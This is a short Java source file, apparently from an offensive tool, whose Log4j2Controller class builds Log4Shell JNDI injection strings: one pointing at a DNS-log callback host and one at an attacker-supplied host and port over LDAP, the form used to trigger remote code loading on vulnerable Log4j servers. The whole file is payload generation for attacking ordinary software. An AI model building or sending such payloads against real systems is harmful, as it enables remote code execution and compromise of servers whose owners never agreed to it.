package com.swordHostDemo.controller;

import com.swordHostDemo.pojo.menuBeanListener;

/**
 * @date: 2022/12/28 20:19
 * @description:
 */
public class Log4j2Controller {
    public static String LoDnslog4j2(){
        String str = "${jndi:ldap://"+menuBeanListener.getDnsLog()+"/}";
        return str;
    }

    public static String LoIPlog4j2(){
        String str = "${jndi:ldap://"+ menuBeanListener.getLhost()+":"+menuBeanListener.getLport()+"/}";
        return str;
    }


}
